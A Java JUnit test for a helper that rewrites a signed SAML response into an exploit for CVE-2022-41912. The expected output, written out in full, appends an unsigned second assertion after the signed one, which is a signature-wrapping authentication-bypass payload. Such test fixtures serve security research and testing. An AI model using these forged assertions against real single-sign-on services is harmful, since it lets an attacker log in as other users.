package helpers;

import org.junit.jupiter.api.Test;
import org.w3c.dom.Document;

import static org.junit.jupiter.api.Assertions.assertEquals;

public class CVE_2022_41912_Test {

    @Test
    void testCVE_2022_41912() throws Exception {
        String originalAssertion =
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                        "<samlp:Response Destination=\"http://localhost:8080/saml/acs\"\n" +
                        "  ID=\"id-f07238f06bc903b2ec9f8ef002359568bf3c2536\"\n" +
                        "  IssueInstant=\"2025-11-30T23:23:10.137Z\" Version=\"2.0\"\n" +
                        "  xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\"\n" +
                        "  xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\">\n" +
                        "  <saml:Issuer Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:entity\">http://localhost:8081/metadata</saml:Issuer>\n" +
                        "  <samlp:Status>\n" +
                        "    <samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/>\n" +
                        "  </samlp:Status>\n" +
                        "  <saml:Assertion ID=\"id-87c8c67ae8683c6f5b6abcff08499e15b9f05022\"\n" +
                        "    IssueInstant=\"2025-11-30T23:23:10.194Z\" Version=\"2.0\" xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\">\n" +
                        "    <saml:Issuer Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:entity\">http://localhost:8081/metadata</saml:Issuer>\n" +
                        "    <ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\">\n" +
                        "      <ds:SignedInfo>\n" +
                        "        <ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/>\n" +
                        "        <ds:SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\"/>\n" +
                        "        <ds:Reference URI=\"#id-87c8c67ae8683c6f5b6abcff08499e15b9f05022\">\n" +
                        "          <ds:Transforms>\n" +
                        "            <ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/>\n" +
                        "            <ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/>\n" +
                        "          </ds:Transforms>\n" +
                        "          <ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\"/>\n" +
                        "          <ds:DigestValue>N2xxKPhoo2+BTgwgp5YeE3a9rUk=</ds:DigestValue>\n" +
                        "        </ds:Reference>\n" +
                        "      </ds:SignedInfo>\n" +
                        "      <ds:SignatureValue>zPFmwfdTdlXJPEB9I/027pXeFR/d31DoWLCJQ8QZVAOp6ypq8s3AexjInOWtTWceb717u/tVFN1SwrCiEGqI3tFrvXgMWP9PJLUPXMSTJpgDZPv18Rag1/lnQpwc+ORzQ6jSqbqg3YbYugJ+JLRQp9AKwoXb1vC58dFHWcSjJCg6Nj8J0JjOPdoLMcXW1delka/1gBbCYuLTvBczpz11bTUUXW/xgsAhL7DY3RU6zwCD/m226zieZQ/W41ynsy856/Z7d4k8ph49bLt8Vr8zmhRe+9zGS68GkcrB26DF33JMxkbSPjkV1Bpf92WobW0JvCCTjXol87rPXwacHRqQjw==</ds:SignatureValue>\n" +
                        "      <ds:KeyInfo>\n" +
                        "        <ds:X509Data>\n" +
                        "          <ds:X509Certificate>MIIC6TCCAdGgAwIBAgIIHC0ZtKe0AzswDQYJKoZIhvcNAQELBQAwGTEXMBUGA1UEAxMOc2FtbC1pZHAtbG9jYWwwHhcNMjUwOTIzMTEwNDEwWhcNMjYwOTIzMTIwNDEwWjAZMRcwFQYDVQQDEw5zYW1sLWlkcC1sb2NhbDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOBOjNVc6C9uDgkRZ30lBz97rRnm8Us1t8/I8hYTLuIsNg3Rs5S2OMmJYnvMeMEYBJGFXqMEtqpRJkDVJujk1NKCB5bJJwadjFULruNF8NnO7G99q+XG1S2fxjDgi+Im/U2+dBmMJNWAJDc54hIBZbv+7jQXUiXQrnaDUX79OGNxQ/I5IC9wLK1xb1wywM4vWx5TrQXfbeMJwYOG3NAGGLayOCjrfIz4yIya8+rzSqWc4ZY0a+VPRFWmaooDw878pQuQJaijFWZbTdSXAwz7Dgm3jeLw/9roYADFtFqK3YMFBg3R8NM6GRhmFce6B9pbu5GM7+uUXFHWFJ2go5MhfOECAwEAAaM1MDMwDgYDVR0PAQH/BAQDAgWgMBMGA1UdJQQMMAoGCCsGAQUFBwMBMAwGA1UdEwEB/wQCMAAwDQYJKoZIhvcNAQELBQADggEBACCpxbXeD8VL+V38f/qrP7H69oP6BHF/snZxmkI8FhsxSPGN9HKZxZpHy8DxLGB/dER4m6pekhpx2NhrNKreh/z4WTYTyI8hALBdZ32XTzDXJtcDIu0znlbngMFgZ+H+GcC9TmIET2FBXpKXnp0On6EsgLZf0NsPVLjcYgfxT9v3DTJqzVajjrK6dSIcoUsswbb0veV11ao3GYkkr/6Mrfb5AB5c+tMe33zJyTlpXEQLa6uwvYLNSWIfySfQcjZUFJpzCvfWVXUdiESn1HSYLz95uFru57syVm6ReI0WulOGL0YvJz/inL9J2QNO11z3Qr95hJYJ/j+k/IGOMcwOAD4=</ds:X509Certificate>\n" +
                        "        </ds:X509Data>\n" +
                        "      </ds:KeyInfo>\n" +
                        "    </ds:Signature>\n" +
                        "    <saml:Subject>\n" +
                        "      <saml:NameID\n" +
                        "        Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:transient\"\n" +
                        "        NameQualifier=\"http://localhost:8081/metadata\" SPNameQualifier=\"http://localhost:8080/saml/metadata\"/>\n" +
                        "      <saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\">\n" +
                        "        <saml:SubjectConfirmationData Address=\"172.18.0.1:35000\"\n" +
                        "          InResponseTo=\"id-b06b1e43284b44b5a2c9a94b917bea99eefd1581\"\n" +
                        "          NotOnOrAfter=\"2025-11-30T23:24:40.137Z\" Recipient=\"http://localhost:8080/saml/acs\"/>\n" +
                        "      </saml:SubjectConfirmation>\n" +
                        "    </saml:Subject>\n" +
                        "    <saml:Conditions NotBefore=\"2025-11-30T23:23:03.896Z\" NotOnOrAfter=\"2025-11-30T23:24:33.896Z\">\n" +
                        "      <saml:AudienceRestriction>\n" +
                        "        <saml:Audience>http://localhost:8080/saml/metadata</saml:Audience>\n" +
                        "      </saml:AudienceRestriction>\n" +
                        "    </saml:Conditions>\n" +
                        "    <saml:AuthnStatement AuthnInstant=\"2025-11-30T23:23:10.194Z\" SessionIndex=\"a12ce4f8c33b66f6e1248476d912ce8517788d50f19e5279b9fa02d7e0c20140\">\n" +
                        "      <saml:SubjectLocality Address=\"172.18.0.1:35000\"/>\n" +
                        "      <saml:AuthnContext>\n" +
                        "        <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef>\n" +
                        "      </saml:AuthnContext>\n" +
                        "    </saml:AuthnStatement>\n" +
                        "    <saml:AttributeStatement>\n" +
                        "      <saml:Attribute FriendlyName=\"uid\"\n" +
                        "        Name=\"urn:oid:0.9.2342.19200300.100.1.1\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\">\n" +
                        "        <saml:AttributeValue\n" +
                        "          xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">user</saml:AttributeValue>\n" +
                        "      </saml:Attribute>\n" +
                        "      <saml:Attribute FriendlyName=\"eduPersonAffiliation\"\n" +
                        "        Name=\"urn:oid:1.3.6.1.4.1.5923.1.1.1.1\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\">\n" +
                        "        <saml:AttributeValue\n" +
                        "          xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">Users</saml:AttributeValue>\n" +
                        "      </saml:Attribute>\n" +
                        "    </saml:AttributeStatement>\n" +
                        "  </saml:Assertion>\n" +
                        "</samlp:Response>";

        String exploitAssertion = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                "<samlp:Response Destination=\"http://localhost:8080/saml/acs\" ID=\"id-f07238f06bc903b2ec9f8ef002359568bf3c2536\" IssueInstant=\"2025-11-30T23:23:10.137Z\" Version=\"2.0\" xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\">\n" +
                "  <saml:Issuer Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:entity\">http://localhost:8081/metadata</saml:Issuer>\n" +
                "  <samlp:Status>\n" +
                "    <samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/>\n" +
                "  </samlp:Status>\n" +
                "  <saml:Assertion ID=\"id-87c8c67ae8683c6f5b6abcff08499e15b9f05022\" IssueInstant=\"2025-11-30T23:23:10.194Z\" Version=\"2.0\" xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\">\n" +
                "    <saml:Issuer Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:entity\">http://localhost:8081/metadata</saml:Issuer>\n" +
                "    <ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\">\n" +
                "      <ds:SignedInfo>\n" +
                "        <ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/>\n" +
                "        <ds:SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\"/>\n" +
                "        <ds:Reference URI=\"#id-87c8c67ae8683c6f5b6abcff08499e15b9f05022\">\n" +
                "          <ds:Transforms>\n" +
                "            <ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/>\n" +
                "            <ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/>\n" +
                "          </ds:Transforms>\n" +
                "          <ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\"/>\n" +
                "          <ds:DigestValue>N2xxKPhoo2+BTgwgp5YeE3a9rUk=</ds:DigestValue>\n" +
                "        </ds:Reference>\n" +
                "      </ds:SignedInfo>\n" +
                "      <ds:SignatureValue>zPFmwfdTdlXJPEB9I/027pXeFR/d31DoWLCJQ8QZVAOp6ypq8s3AexjInOWtTWceb717u/tVFN1SwrCiEGqI3tFrvXgMWP9PJLUPXMSTJpgDZPv18Rag1/lnQpwc+ORzQ6jSqbqg3YbYugJ+JLRQp9AKwoXb1vC58dFHWcSjJCg6Nj8J0JjOPdoLMcXW1delka/1gBbCYuLTvBczpz11bTUUXW/xgsAhL7DY3RU6zwCD/m226zieZQ/W41ynsy856/Z7d4k8ph49bLt8Vr8zmhRe+9zGS68GkcrB26DF33JMxkbSPjkV1Bpf92WobW0JvCCTjXol87rPXwacHRqQjw==</ds:SignatureValue>\n" +
                "      <ds:KeyInfo>\n" +
                "        <ds:X509Data>\n" +
                "          <ds:X509Certificate>MIIC6TCCAdGgAwIBAgIIHC0ZtKe0AzswDQYJKoZIhvcNAQELBQAwGTEXMBUGA1UEAxMOc2FtbC1pZHAtbG9jYWwwHhcNMjUwOTIzMTEwNDEwWhcNMjYwOTIzMTIwNDEwWjAZMRcwFQYDVQQDEw5zYW1sLWlkcC1sb2NhbDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOBOjNVc6C9uDgkRZ30lBz97rRnm8Us1t8/I8hYTLuIsNg3Rs5S2OMmJYnvMeMEYBJGFXqMEtqpRJkDVJujk1NKCB5bJJwadjFULruNF8NnO7G99q+XG1S2fxjDgi+Im/U2+dBmMJNWAJDc54hIBZbv+7jQXUiXQrnaDUX79OGNxQ/I5IC9wLK1xb1wywM4vWx5TrQXfbeMJwYOG3NAGGLayOCjrfIz4yIya8+rzSqWc4ZY0a+VPRFWmaooDw878pQuQJaijFWZbTdSXAwz7Dgm3jeLw/9roYADFtFqK3YMFBg3R8NM6GRhmFce6B9pbu5GM7+uUXFHWFJ2go5MhfOECAwEAAaM1MDMwDgYDVR0PAQH/BAQDAgWgMBMGA1UdJQQMMAoGCCsGAQUFBwMBMAwGA1UdEwEB/wQCMAAwDQYJKoZIhvcNAQELBQADggEBACCpxbXeD8VL+V38f/qrP7H69oP6BHF/snZxmkI8FhsxSPGN9HKZxZpHy8DxLGB/dER4m6pekhpx2NhrNKreh/z4WTYTyI8hALBdZ32XTzDXJtcDIu0znlbngMFgZ+H+GcC9TmIET2FBXpKXnp0On6EsgLZf0NsPVLjcYgfxT9v3DTJqzVajjrK6dSIcoUsswbb0veV11ao3GYkkr/6Mrfb5AB5c+tMe33zJyTlpXEQLa6uwvYLNSWIfySfQcjZUFJpzCvfWVXUdiESn1HSYLz95uFru57syVm6ReI0WulOGL0YvJz/inL9J2QNO11z3Qr95hJYJ/j+k/IGOMcwOAD4=</ds:X509Certificate>\n" +
                "        </ds:X509Data>\n" +
                "      </ds:KeyInfo>\n" +
                "    </ds:Signature>\n" +
                "    <saml:Subject>\n" +
                "      <saml:NameID Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:transient\" NameQualifier=\"http://localhost:8081/metadata\" SPNameQualifier=\"http://localhost:8080/saml/metadata\"/>\n" +
                "      <saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\">\n" +
                "        <saml:SubjectConfirmationData Address=\"172.18.0.1:35000\" InResponseTo=\"id-b06b1e43284b44b5a2c9a94b917bea99eefd1581\" NotOnOrAfter=\"2025-11-30T23:24:40.137Z\" Recipient=\"http://localhost:8080/saml/acs\"/>\n" +
                "      </saml:SubjectConfirmation>\n" +
                "    </saml:Subject>\n" +
                "    <saml:Conditions NotBefore=\"2025-11-30T23:23:03.896Z\" NotOnOrAfter=\"2025-11-30T23:24:33.896Z\">\n" +
                "      <saml:AudienceRestriction>\n" +
                "        <saml:Audience>http://localhost:8080/saml/metadata</saml:Audience>\n" +
                "      </saml:AudienceRestriction>\n" +
                "    </saml:Conditions>\n" +
                "    <saml:AuthnStatement AuthnInstant=\"2025-11-30T23:23:10.194Z\" SessionIndex=\"a12ce4f8c33b66f6e1248476d912ce8517788d50f19e5279b9fa02d7e0c20140\">\n" +
                "      <saml:SubjectLocality Address=\"172.18.0.1:35000\"/>\n" +
                "      <saml:AuthnContext>\n" +
                "        <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef>\n" +
                "      </saml:AuthnContext>\n" +
                "    </saml:AuthnStatement>\n" +
                "    <saml:AttributeStatement>\n" +
                "      <saml:Attribute FriendlyName=\"uid\" Name=\"urn:oid:0.9.2342.19200300.100.1.1\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\">\n" +
                "        <saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">user</saml:AttributeValue>\n" +
                "      </saml:Attribute>\n" +
                "      <saml:Attribute FriendlyName=\"eduPersonAffiliation\" Name=\"urn:oid:1.3.6.1.4.1.5923.1.1.1.1\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\">\n" +
                "        <saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">Users</saml:AttributeValue>\n" +
                "      </saml:Attribute>\n" +
                "    </saml:AttributeStatement>\n" +
                "  </saml:Assertion>\n" +
                "<saml:Assertion ID=\"id-87c8c67ae8683c6f5b6abcff08499e15b9f05022_attack\" IssueInstant=\"2025-11-30T23:23:10.194Z\" Version=\"2.0\" xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\">\n" +
                "    <saml:Issuer Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:entity\">http://localhost:8081/metadata</saml:Issuer>\n" +
                "    <saml:Subject>\n" +
                "      <saml:NameID Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:transient\" NameQualifier=\"http://localhost:8081/metadata\" SPNameQualifier=\"http://localhost:8080/saml/metadata\"/>\n" +
                "      <saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\">\n" +
                "        <saml:SubjectConfirmationData Address=\"172.18.0.1:35000\" InResponseTo=\"id-b06b1e43284b44b5a2c9a94b917bea99eefd1581\" NotOnOrAfter=\"2025-11-30T23:24:40.137Z\" Recipient=\"http://localhost:8080/saml/acs\"/>\n" +
                "      </saml:SubjectConfirmation>\n" +
                "    </saml:Subject>\n" +
                "    <saml:Conditions NotBefore=\"2025-11-30T23:23:03.896Z\" NotOnOrAfter=\"2025-11-30T23:24:33.896Z\">\n" +
                "      <saml:AudienceRestriction>\n" +
                "        <saml:Audience>http://localhost:8080/saml/metadata</saml:Audience>\n" +
                "      </saml:AudienceRestriction>\n" +
                "    </saml:Conditions>\n" +
                "    <saml:AuthnStatement AuthnInstant=\"2025-11-30T23:23:10.194Z\" SessionIndex=\"a12ce4f8c33b66f6e1248476d912ce8517788d50f19e5279b9fa02d7e0c20140\">\n" +
                "      <saml:SubjectLocality Address=\"172.18.0.1:35000\"/>\n" +
                "      <saml:AuthnContext>\n" +
                "        <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef>\n" +
                "      </saml:AuthnContext>\n" +
                "    </saml:AuthnStatement>\n" +
                "    <saml:AttributeStatement>\n" +
                "      <saml:Attribute FriendlyName=\"uid\" Name=\"urn:oid:0.9.2342.19200300.100.1.1\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\">\n" +
                "        <saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">user</saml:AttributeValue>\n" +
                "      </saml:Attribute>\n" +
                "      <saml:Attribute FriendlyName=\"eduPersonAffiliation\" Name=\"urn:oid:1.3.6.1.4.1.5923.1.1.1.1\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\">\n" +
                "        <saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">Users</saml:AttributeValue>\n" +
                "      </saml:Attribute>\n" +
                "    </saml:AttributeStatement>\n" +
                "  </saml:Assertion></samlp:Response>";

        var exploit = CVE_2022_41912.apply(originalAssertion);
        assertEquals(exploitAssertion, exploit);
    }
}
